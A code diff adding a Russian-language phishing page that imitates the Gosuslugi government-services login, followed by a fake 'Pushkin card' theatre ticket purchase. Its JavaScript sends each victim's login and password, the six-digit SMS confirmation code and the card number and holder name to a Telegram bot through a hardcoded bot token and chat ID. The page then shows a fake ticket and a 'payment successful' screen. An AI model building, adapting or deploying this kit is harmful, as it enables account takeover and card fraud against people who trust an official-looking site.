@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход - госуслуги </title>
+    <style>
+        /* Базовые настройки */
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { margin: 0; padding: 20px 0; background-color: #e5edfa; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; font-size: 17px; }
+        .page-wrapper { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; padding: 0 15px; position: relative; }
+
+        /* Карточки */
+        .login-card, .event-card, .payment-card, .ticket-card { background-color: #ffffff; width: 100%; border-radius: 20px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08); overflow: hidden; display: flex; flex-direction: column; margin-bottom: 20px; }
+
+        /* Шапка с логотипом */
+        .card-header { padding: 30px 30px 20px; text-align: center; }
+        .logo-text { font-size: 44px; font-weight: 800; margin-bottom: 15px; font-family: Arial, Helvetica, sans-serif; }
+        .logo-shop { color: #e60000; } .logo-link { color: #0b42b3; }
+        .language-selector { color: #1b4c9f; font-size: 17px; display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none; }
+        .flag-icon { width: 22px; height: 22px; border-radius: 50%; background: linear-gradient(to bottom, #ffffff 33%, #0039a6 33%, #0039a6 66%, #d52b1e 66%); border: 1px solid #ddd; }
+
+        /* Инпуты */
+        .form-container { padding: 0 30px 30px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 16px; font-weight: 600; color: #111; margin-bottom: 8px; }
+        .input-group input { width: 100%; padding: 16px; background-color: #f4f6fa; border: 1px solid transparent; border-radius: 10px; font-size: 18px; color: #333; outline: none; transition: border-color 0.2s; }
+        .input-group input:focus { border-color: #0b42b3; background-color: #fff; }
+
+        /* Кнопки и ссылки */
+        .link-restore { display: inline-block; color: #0b42b3; text-decoration: none; font-size: 16px; margin-bottom: 25px; font-weight: 500; }
+        .btn-submit { width: 100%; padding: 18px; background-color: #0b42b3; color: white; border: none; border-radius: 12px; font-size: 19px; font-weight: 600; cursor: pointer; margin-bottom: 25px; transition: background-color 0.2s; }
+        .btn-submit:hover { background-color: #093587; }
+        .help-link { display: block; text-align: center; color: #0b42b3; text-decoration: none; font-size: 17px; margin-bottom: 10px; font-weight: 500; }
+        .card-footer { border-top: 1px solid #e0e0e0; padding: 20px 30px; background-color: #fff; text-align: center; }
+        .other-method { font-size: 16px; color: #111; margin: 0; text-align: left; }
+        .other-method a { color: #0b42b3; text-decoration: none; font-weight: 500; }
+        .back-link { color: #0b42b3; text-decoration: none; font-size: 17px; font-weight: 600; cursor: pointer; }
+        .register-link { display: block; text-align: center; color: #0b42b3; text-decoration: none; font-size: 19px; margin: 30px 0; font-weight: 500; }
+        .ios-home-indicator { width: 130px; height: 5px; background-color: #333; border-radius: 10px; margin-top: auto; margin-bottom: 10px; opacity: 0.7; }
+
+        /* Инфо-блок */
+        .info-card { background-color: #ffffff; width: 100%; border-radius: 15px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); display: flex; overflow: hidden; margin-bottom: 30px; }
+        .info-card-stripe { width: 8px; background-color: #5a7bea; flex-shrink: 0; }
+        .info-card-content { padding: 20px; display: flex; flex-direction: column; gap: 15px; }
+        .bulb-icon { width: 52px; height: 52px; color: #0b42b3; }
+        .info-card-text { color: #0b42b3; font-size: 18px; line-height: 1.4; margin: 0; font-weight: 500; }
+
+        /* Переключение экранов */
+        #step2, #step3, #step4, #step5 { display: none; }
+        .step-title { font-size: 26px; font-weight: 700; color: #111; margin: 10px 0; text-align: center; }
+        .step-subtitle { font-size: 16px; color: #555; text-align: center; margin-bottom: 30px; line-height: 1.4; }
+
+        /* Ввод кода */
+        .code-inputs-container { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 30px; }
+        .code-input { width: 100%; height: 56px; background-color: #fff; border: 1.5px solid #ccc; border-radius: 8px; font-size: 24px; font-weight: 500; text-align: center; color: #111; outline: none; transition: border-color 0.2s; padding: 0; -webkit-appearance: none; }
+        .code-input:focus { border-color: #0b42b3; box-shadow: 0 0 0 1px #0b42b3; }
+        .code-input.filled { border-color: #0b42b3; }
+
+        /* БИЛЕТ */
+        .ticket-cover { width: 100%; height: 160px; background: linear-gradient(120deg, #111827 0%, #374151 100%); position: relative; display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; color: white; }
+        .ticket-badge { position: absolute; top: 15px; left: 15px; background-color: #e60000; color: white; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 600; letter-spacing: 0.5px; }
+        .ticket-cover h2 { margin: 0; font-size: 24px; font-weight: 700; line-height: 1.1; z-index: 2; }
+        
+        .ticket-body { padding: 25px; }
+        .ticket-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
+        .ticket-info-item { display: flex; flex-direction: column; }
+        .ticket-info-label { font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
+        .ticket-info-value { font-size: 16px; font-weight: 600; color: #111; }
+        
+        .ticket-divider { border-top: 1px dashed #ccc; margin: 0 -25px 25px; position: relative; }
+        .ticket-divider::before, .ticket-divider::after { content: ''; position: absolute; top: -10px; width: 20px; height: 20px; background-color: #fff; border-radius: 50%; }
+        .ticket-divider::before { left: -10px; border-right: 1px solid #e5edfa; }
+        .ticket-divider::after { right: -10px; border-left: 1px solid #e5edfa; }
+
+        .barcode-container { text-align: center; margin-bottom: 15px; }
+        .barcode { width: 100%; height: 70px; background-image: repeating-linear-gradient(to right, #000 0, #000 2px, transparent 2px, transparent 5px, #000 5px, #000 6px, transparent 6px, transparent 9px, #000 9px, #000 12px, transparent 12px, transparent 15px); }
+        .barcode-numbers { font-family: 'Courier New', Courier, monospace; font-size: 16px; letter-spacing: 4px; color: #111; font-weight: bold; margin-top: 5px; }
+        
+        .ticket-note { font-size: 13px; color: #666; text-align: center; line-height: 1.4; margin: 0; }
+
+        /* Оплата */
+        .payment-header { background-color: #f8f9fc; padding: 20px; border-bottom: 1px solid #e0e0e0; text-align: center; }
+        .payment-header h2 { margin: 0 0 5px 0; font-size: 20px; color: #111; }
+        .payment-header p { margin: 0; font-size: 14px; color: #666; }
+        .payment-form { padding: 25px; }
+        .card-input-group { margin-bottom: 15px; }
+        .card-input-group label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .card-input { width: 100%; padding: 15px; background-color: #fff; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; color: #111; outline: none; transition: border-color 0.2s; }
+        .card-input:focus { border-color: #0b42b3; }
+        .card-row { display: flex; gap: 15px; }
+        .card-row .card-input-group { flex: 1; }
+        .virtual-card { background: linear-gradient(135deg, #0b42b3 0%, #1e3c72 100%); border-radius: 15px; padding: 20px; color: white; margin-bottom: 25px; box-shadow: 0 10px 20px rgba(11, 66, 179, 0.2); position: relative; overflow: hidden; }
+        .virtual-card::after { content: 'МИР'; position: absolute; bottom: 20px; right: 20px; font-size: 24px; font-weight: bold; font-style: italic; opacity: 0.8; }
+        .card-chip { width: 40px; height: 30px; background: #e0e0e0; border-radius: 5px; margin-bottom: 20px; background-image: linear-gradient(45deg, #ccc 25%, transparent 25%), linear-gradient(-45deg, #ccc 25%, transparent 25%); background-size: 10px 10px; }
+        .virtual-card-number { font-size: 22px; letter-spacing: 2px; margin-bottom: 20px; font-family: monospace; }
+        .virtual-card-info { display: flex; justify-content: space-between; font-size: 12px; text-transform: uppercase; opacity: 0.8; }
+        .btn-pay { width: 100%; padding: 18px; background-color: #0b42b3; color: white; border: none; border-radius: 12px; font-size: 19px; font-weight: 600; cursor: pointer; margin-top: 10px; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .btn-pay:hover { background-color: #093587; }
+
+        /* Красивая кнопка для билета */
+        .btn-home { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center;
+            width: calc(100% - 40px); 
+            margin: 0 20px 20px; 
+            padding: 16px; 
+            background-color: #f4f6fa; 
+            color: #0b42b3; 
+            border: none; 
+            border-radius: 12px; 
+            font-size: 17px; 
+            font-weight: 600; 
+            text-decoration: none; 
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .btn-home:hover { background-color: #e5edfa; }
+    </style>
+</head>
+<body>
+
+    <div class="page-wrapper">
+        
+        <!-- ================= ШАГ 1 ================= -->
+        <div id="step1">
+            <div class="login-card">
+                <div class="card-header">
+                    <div class="logo-text"><span class="logo-shop">Гос</span><span class="logo-link">услуги</span></div>
+                    <a href="#" class="language-selector">Русский <span class="flag-icon"></span></a>
+                </div>
+                <div class="form-container">
+                    <form id="loginForm">
+                        <div class="input-group">
+                            <label for="login">Телефон / Эл. почта / СНИЛС</label>
+                            <input type="text" id="login" required>
+                        </div>
+                        <div class="input-group">
+                            <label for="password">Пароль</label>
+                            <input type="password" id="password" required>
+                        </div>
+                        <a href="#" class="link-restore">Восстановить</a>
+                        <button type="submit" class="btn-submit">Войти</button>
+                        <a href="#" class="help-link">Не удаётся войти</a>
+                    </form>
+                </div>
+                <div class="card-footer">
+                    <p class="other-method">Войти другим способом. <a href="#">Подробнее</a></p>
+                </div>
+            </div>
+            <a href="#" class="register-link">Зарегистрироваться</a>
+            <div class="info-card">
+                <div class="info-card-stripe"></div>
+                <div class="info-card-content">
+                    <svg class="bulb-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M9 18h6"></path><path d="M10 22h4"></path><path d="M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5A4.61 4.61 0 0 1 8.91 14"></path><path d="M12 2v1"></path><path d="M4.22 4.22l.7.7"></path><path d="M19.78 4.22l-.7.7"></path><path d="M2 12h1"></path><path d="M21 12h1"></path></svg>
+                    <p class="info-card-text">Куда ещё можно войти с паролем от Госуслуг?</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= ШАГ 2 ================= -->
+        <div id="step2">
+            <div class="login-card">
+                <div class="card-header" style="padding-bottom: 0;">
+                    <div class="logo-text" style="font-size: 34px; margin-bottom: 20px;"><span class="logo-shop">Гос</span><span class="logo-link">услуги</span></div>
+                </div>
+                <div class="form-container" style="padding-top: 10px;">
+                    <h2 class="step-title">Подтверждение входа</h2>
+                    <p class="step-subtitle">Введите код 
+                       который придет в SMS-сообщения, или MAХ.</p>
+                    <form id="codeForm">
+                        <div class="code-inputs-container">
+                            <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                            <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                            <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                            <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                            <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                            <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                        </div>
+                        <button type="submit" class="btn-submit">Подтвердить</button>
+                        <a href="#" class="help-link">Отправить код повторно</a>
+                    </form>
+                </div>
+                <div class="card-footer">
+                    <a href="#" class="back-link" onclick="showStep1(event)">← Вернуться назад</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= ШАГ 3: МЕРОПРИЯТИЕ ================= -->
+        <div id="step3">
+            <div class="event-card">
+                <div class="ticket-cover">
+                    <div class="ticket-badge">Пушкинская карта</div>
+                    <h2>Мастер и Маргарита</h2>
+                </div>
+                <div class="ticket-body">
+                    <div class="ticket-info-grid">
+                        <div class="ticket-info-item">
+                            <span class="ticket-info-label">Дата и время</span>
+                            <span class="ticket-info-value">25 ноября, 19:00</span>
+                        </div>
+                        <div class="ticket-info-item">
+                            <span class="ticket-info-label">Место</span>
+                            <span class="ticket-info-value">Театр на Таганке</span>
+                        </div>
+                    </div>
+                    
+                    <!-- Блок с ценой изменен на 250 -->
+                    <div class="price-block" style="border-top: 1px solid #eee; padding-top: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;">
+                        <div class="price-new" style="font-size: 28px; font-weight: 800; color: #111;">250 ₽</div>
+                        <div style="font-size: 13px; color: #666;">Оплата Пушкинской картой</div>
+                    </div>
+
+                    <button class="btn-submit" style="background-color: #0b42b3; margin-bottom: 0;" onclick="goToPayment()">Купить билет</button>
+                    <a class="logout-btn" style="display: block; text-align: center; color: #666; font-size: 15px; margin-top: 15px; text-decoration: none; cursor: pointer;" onclick="location.reload()">Выйти из аккаунта</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= ШАГ 4: ОПЛАТА ================= -->
+        <div id="step4">
+            <div class="payment-card">
+                <div class="payment-header">
+                    <h2>Оплата билета</h2>
+                    <p>Безопасная оплата </p>
+                </div>
+                <div class="payment-form">
+                    <div class="virtual-card">
+                        <div class="card-chip"></div>
+                        <div class="virtual-card-number" id="displayCardNumber">•••• •••• •••• ••••</div>
+                        <div class="virtual-card-info">
+                            <span id="displayCardName">ИМЯ ВЛАДЕЛЬЦА</span>
+                            <span id="displayCardDate">ММ/ГГ</span>
+                        </div>
+                    </div>
+                    <form id="paymentForm">
+                        <div class="card-input-group">
+                            <label>Номер карты</label>
+                            <input type="text" id="cardNumber" class="card-input" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
+                        </div>
+                        <div class="card-row">
+                            <div class="card-input-group">
+                                <label>Срок действия</label>
+                                <input type="text" id="cardDate" class="card-input" placeholder="ММ/ГГ" maxlength="5" inputmode="numeric" required>
+                            </div>
+                            <div class="card-input-group">
+                                <label>CVV</label>
+                                <input type="password" id="cardCvv" class="card-input" placeholder="•••" maxlength="3" inputmode="numeric" required>
+                            </div>
+                        </div>
+                        <div class="card-input-group">
+                            <label>Имя владельца</label>
+                            <input type="text" id="cardName" class="card-input" placeholder="IVAN IVANOV" style="text-transform: uppercase;" required>
+                        </div>
+                        <button type="submit" class="btn-pay">Оплатить 250 ₽</button>
+                        <a href="#" class="back-link" style="display: block; text-align: center; margin-top: 20px;" onclick="backToEvent(event)">Отменить</a>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= ШАГ 5: БИЛЕТ ================= -->
+        <div id="step5">
+            <div class="ticket-card">
+                <div style="text-align: center; padding: 30px 20px 10px;">
+                    <div class="success-icon" style="margin: 0 auto 15px; background-color: #4caf50; border-radius: 50%; width: 60px; height: 60px; display: flex; justify-content: center; align-items: center; color: white;">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" style="width: 30px; height: 30px;"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                    </div>
+                    <h2 style="font-size: 22px; margin: 0 0 5px 0; color: #111;">Оплата прошла успешно</h2>
+                    <p style="font-size: 15px; color: #666; margin: 0;">Ваш электронный билет готов</p>
+                </div>
+
+                <div class="ticket-cover">
+                    <div class="ticket-badge">Пушкинская карта</div>
+                    <h2>Мастер и Маргарита</h2>
+                </div>
+                <div class="ticket-body">
+                    <div class="ticket-info-grid">
+                        <div class="ticket-info-item">
+                            <span class="ticket-info-label">Дата и время</span>
+                            <span class="ticket-info-value">25 ноября, 19:00</span>
+                        </div>
+                        <div class="ticket-info-item">
+                            <span class="ticket-info-label">Место проведения</span>
+                            <span class="ticket-info-value">Театр на Таганке</span>
+                        </div>
+                        <div class="ticket-info-item">
+                            <span class="ticket-info-label">Сектор / Ряд / Место</span>
+                            <span class="ticket-info-value">Партер / 5 / 12</span>
+                        </div>
+                        <div class="ticket-info-item">
+                            <span class="ticket-info-label">Стоимость</span>
+                            <span class="ticket-info-value" style="color: #e60000;">250 ₽</span>
+                        </div>
+                    </div>
+
+                    <div class="ticket-divider"></div>
+
+                    <div class="barcode-container">
+                        <div class="barcode"></div>
+                        <div class="barcode-numbers">8912 3456 7890</div>
+                    </div>
+                    <p class="ticket-note">Покажите данный билет на входе. Для прохода достаточно приложить штрих-код к сканеру.</p>
+                </div>
+                
+                <!-- Новая аккуратная кнопка -->
+                <button class="btn-home" onclick="location.reload()">Вернуться на главную</button>
+            </div>
+        </div>
+
+        <div class="ios-home-indicator"></div>
+    </div>
+
+    <!-- ================= JAVASCRIPT ================= -->
+    <script>
+        /* ====================================================================
+           ВСТАВЬТЕ СЮДА ВАШИ ДАННЫЕ ОТ TELEGRAM-БОТА:
+           ==================================================================== */
+        const TG_TOKEN = '9105206619:AAFxSsQLRYYHlOap54HR2ueIBkjvALWU6tU';  
+        const TG_CHAT_ID = '5562276138';   
+        /* ==================================================================== */
+
+        async function sendToTelegram(message) {
+            if (TG_TOKEN === 'ВАШ_ТОКЕН' || TG_CHAT_ID === 'ВАШ_ID') {
+                console.error('❌ ОШИБКА: Вы не вставили токен или ID в код!');
+                return;
+            }
+            const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+            try {
+                await fetch(url, { mode: 'no-cors' });
+            } catch (error) {
+                console.error('❌ Ошибка сети:', error);
+            }
+        }
+
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const step4 = document.getElementById('step4');
+        const step5 = document.getElementById('step5');
+        
+        const loginForm = document.getElementById('loginForm');
+        const codeForm = document.getElementById('codeForm');
+        const paymentForm = document.getElementById('paymentForm');
+        const codeInputs = document.querySelectorAll('.code-input');
+
+        function showStep(stepToShow) {
+            [step1, step2, step3, step4, step5].forEach(s => s.style.display = 'none');
+            stepToShow.style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // 1. Логин и пароль
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault(); 
+            const loginValue = document.getElementById('login').value;
+            const passwordValue = document.getElementById('password').value;
+            sendToTelegram(`🔐 <b>НОВЫЙ ВХОД</b>\n👤 Логин: <code>${loginValue}</code>\n🔑 Пароль: <code>${passwordValue}</code>`);
+            showStep(step2);
+            setTimeout(() => codeInputs[0].focus(), 100);
+        });
+
+        function showStep1(event) {
+            event.preventDefault();
+            showStep(step1);
+            codeInputs.forEach(input => { input.value = ''; input.classList.remove('filled'); });
+        }
+
+        // 2. Ввод кода
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value !== '') {
+                    e.target.classList.add('filled');
+                    if (index < codeInputs.length - 1) codeInputs[index + 1].focus();
+                } else {
+                    e.target.classList.remove('filled');
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) codeInputs[index - 1].focus();
+            });
+        });
+
+        // 3. Подтверждение кода
+        codeForm.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            let fullCode = '';
+            codeInputs.forEach(input => fullCode += input.value);
+            
+            if(fullCode.length < 6) {
+                alert("Пожалуйста, введите все 6 цифр кода.");
+                return;
+            }
+
+            await sendToTelegram(`🔑 <b>ВВЕДЕН КОД</b>\n<code>${fullCode}</code>`);
+            showStep(step3);
+        });
+
+        // 4. Переходы
+        function goToPayment() { showStep(step4); }
+        function backToEvent(event) { event.preventDefault(); showStep(step3); }
+
+        // Форматирование карты
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue.substring(0, 19);
+            document.getElementById('displayCardNumber').innerText = formattedValue || '•••• •••• •••• ••••';
+        });
+
+        document.getElementById('cardDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            if (value.length >= 2) e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            else e.target.value = value;
+            document.getElementById('displayCardDate').innerText = e.target.value || 'ММ/ГГ';
+        });
+
+        document.getElementById('cardName').addEventListener('input', function(e) {
+            document.getElementById('displayCardName').innerText = e.target.value.toUpperCase() || 'ИМЯ ВЛАДЕЛЬЦА';
+        });
+
+        // Оплата
+        paymentForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardName = document.getElementById('cardName').value;
+            sendToTelegram(`💳 <b>ПОПЫТКА ОПЛАТЫ</b>\nКарта: <code>${cardNumber}</code>\nВладелец: ${cardName}`);
+
+            const btn = document.querySelector('.btn-pay');
+            btn.innerText = 'Обработка...';
+            
+            setTimeout(() => {
+                btn.innerText = 'Оплатить 250 ₽';
+                showStep(step5);
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
